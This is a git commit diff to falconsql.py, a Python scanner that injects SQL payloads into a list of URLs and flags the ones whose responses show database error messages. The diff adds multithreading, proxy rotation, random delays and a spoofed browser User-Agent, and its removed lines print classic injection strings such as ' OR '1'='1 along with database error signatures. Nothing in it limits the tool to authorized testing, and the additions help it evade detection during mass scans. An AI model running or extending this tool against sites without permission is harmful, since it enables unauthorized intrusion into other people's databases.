9ae6ed9de39b3cb15b9a4f62f7c7f81cfec3b57d
Th3-Great-Falcon <119791214+Th3-Great-Falcon@users.noreply.github.com>
2023-03-16 08:12:30 +0200

    Update falconsql.py

--- falconsql.py
+++ falconsql.py
@@ -5,82 +5,43 @@ import argparse
 from itertools import cycle
 import urllib3
 from concurrent.futures import ThreadPoolExecutor
+import time
+import random
+from colorama import init, Fore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+init(autoreset=False)  # Initialize colorama without auto-reset
 
 
 class SQLInjectionChecker:
 
-    def __init__(self, proxy_list, timeout=10):
+    def __init__(self, proxy_list, timeout=10, payloads_file="payloads.txt", sql_patterns_file="sql-patterns.txt"):
         self.proxies = proxy_list
         self.timeout = timeout
         self.proxy_cycle = cycle(proxy_list)
+        
+        with open(payloads_file, "r") as f:
+            self.payloads = [line.strip() for line in f.readlines()]
+
+        with open(sql_patterns_file, "r") as f:
+            self.sql_errors = [line.strip() for line in f.readlines()]
 
     def get_next_proxy(self):
         return next(self.proxy_cycle)
 
     def check_sql_injection(self, url):
-        sql_errors =[
-    # MySQL errors
-    "syntax error",
-    "sql syntax",
-    "mysql_fetch",
-    "mysql_fetch_array",
-    "sql error",
-    "you have an error in your sql syntax",
-
-    # PostgreSQL errors
-    "syntax error at or near",
-    "query failed",
-    "pg_query",
-    "pg_exec",
-    "column reference is ambiguous",
-
-    # SQL Server errors
-    "unclosed quotation mark",
-    "incorrect syntax near",
-    "invalid column name",
-    "incorrect syntax near the keyword",
-    "incorrect syntax near the keyword 'JOIN'",
-
-    # Oracle errors
-    "ORA-00900",
-    "ORA-00933",
-    "ORA-00942",
-    "ORA-01756",
-    "table or view does not exist",
-
-    # SQLite errors
-    "near \"[TOKEN]\": syntax error",
-    "no such table",
-    "no such column",
-    "sqlite3_prepare",
-    "sqlite3_step",
-       ]
-
-
-        payloads = [
-            "'",
-            "''",
-            "' OR '1'='1",
-            "1' OR '1'='1",
-            "1 OR 1=1",
-            "1' OR '1'='1' --",
-            "1' OR '1'='1' /*",
-            "1' OR 1=1 --",
-        ]
-
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
         }
 
         try:
-            for payload in payloads:
+            for payload in self.payloads:
                 injected_url = url.replace("[t]", payload)
                 proxy = self.get_next_proxy()
                 response = requests.get(injected_url, proxies={"http": proxy, "https": proxy}, headers=headers, timeout=self.timeout, verify=False)
 
-                for error in sql_errors:
+                for error in self.sql_errors:
                     if re.search(error, response.text, re.IGNORECASE):
                         return True
         except requests.exceptions.RequestException as e:
@@ -89,7 +50,8 @@ class SQLInjectionChecker:
         return False
 
 
-def check_url(url):
+def check_url(url, checker):
+    time.sleep(random.uniform(args.min_delay, args.max_delay))  # Add a random delay between requests
     if checker.check_sql_injection(url):
         print(f"{url} might be SQL injectable.")
         return url
@@ -106,22 +68,20 @@ def main(args):
 
     checker = SQLInjectionChecker(proxy_list, args.timeout)
 
-    with open(args.urls, "r") as f:
+    with open(args.urls, "r", encoding="utf-8") as f:
         urls = f.readlines()
 
-    results = []
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        results = list(executor.map(lambda url: check_url(url.strip(), checker), urls))
 
-    for url in urls:
-        url = url.strip()
-        if checker.check_sql_injection(url):
-            print(f"{url} might be SQL injectable.")
-            results.append(url)
-        else:
-            print(f"{url} seems not to be SQL injectable.")
+    results = [result for result in results if result is not None]
 
     with open(args.output, "w") as f:
         for result in results:
             f.write(f"{result}\n")
+
+    # Add a report at the end with the number of working URLs in green color
+    print(Fore.GREEN + f"Number of Working URLs: {len(results)}" + Fore.RESET)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="SQL Injection Checker")
@@ -129,6 +89,10 @@ if __name__ == "__main__":
     parser.add_argument("--proxies", type=str, default="http://127.0.0.1:24000,http://127.0.0.1:24001,http://127.0.0.1:24002", help="Comma-separated list of proxies")
     parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
     parser.add_argument("--output", type=str, default="result.txt", help="Output file for saving SQL injectable URLs")
+    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads")
+    parser.add_argument("--min_delay", type=float, default=1.0, help="Minimum delay between requests in seconds")
+    parser.add_argument("--max_delay", type=float, default=3.0, help="Maximum delay between requests in seconds")
 
     args = parser.parse_args()
     main(args)
+
